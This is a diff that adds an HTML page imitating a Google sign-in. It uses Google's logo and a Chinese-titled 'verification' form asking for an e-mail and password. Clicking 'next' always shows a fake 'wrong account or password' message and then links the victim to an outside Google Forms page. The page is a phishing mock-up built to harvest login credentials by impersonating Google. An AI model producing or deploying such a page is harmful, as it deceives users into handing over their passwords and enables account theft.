@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>驗證</title>
+	<style type="text/css">
+		* {
+			margin:0;
+			padding:0;
+			font-family: arial;
+		}
+		.google ,.google2{
+			text-align:center;
+			margin: 50px;
+		}
+		.google2{
+			display:none;
+		}
+		.google img ,.google2 img{
+			width:300px;
+			height:101px;
+		}
+		.google h1 ,.google2 h1{
+			margin:20px;
+		}
+		.test img{
+			width:120px;
+			height:102px;
+			margin:20px;
+		}
+		.test {
+			margin: 0 auto;
+			width:300px;
+			padding:40px;
+			box-shadow:4px 2px 12px 1px rgba(20%,20%,40%,0.5);
+		}
+		.test button {
+			background-color: #3079ed; /* Green */
+			border: none;
+			color: white;
+			padding: 10px 30px;
+			text-align: center;
+			text-decoration: none;
+			display: inline-block;
+			font-size: 16px;
+			margin: 4px 2px;
+			cursor: pointer;
+			margin:10px;
+			width:220px;
+			border-radius:5px;
+		}
+		.test p{
+			padding:10px 0 0 0;
+			color:#FF0000;
+		}
+	</style>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$('button').on('click',function(){
+				$('.google').hide();
+				$('.google2').delay(500).slideDown(0);
+			});
+		});
+	</script>
+</head>
+<body>
+	<div class="google">
+		<img src="https://www.google.com.tw/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="" class="loge">
+		<h1>驗證進入表單</h1>
+		<div class="test">
+			<img class="people" src="未命名.png" alt="" >
+				<form>
+				  E-mail<br>
+				  <input type="text" style="width: 200px; padding: 3px;" name="firstname">
+				  <br>
+				  <br>
+				  Password<br>
+				  <input type="text" style="width: 200px; padding: 3px; " name="firstname">
+				</form>
+			<button>下一步</button>
+		</div>
+	</div>
+	<div class="google2">
+		<img src="https://www.google.com.tw/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="" class="loge">
+		<h1>驗證進入表單</h1>
+		<div class="test">
+			<img class="people" src="未命名.png" alt="" >
+				<form>
+				  E-mail<br>
+				  <input type="text" style="width: 200px; padding: 3px;" name="firstname">
+				  <br>
+				  <br>
+				  Password<br>
+				  <input type="text" style="width: 200px; padding: 3px; " name="firstname">
+				</form>
+			<p>帳號密碼錯誤</p>
+			<a href="https://docs.google.com/forms/d/1HXK3YYG8EOwqGprxYUmjKhegWcQOZcebU4RgFBmHn3M/edit?usp=forms_home"><button>下一步</button></a>
+		</div>
+	</div>
+</body>
+</html>
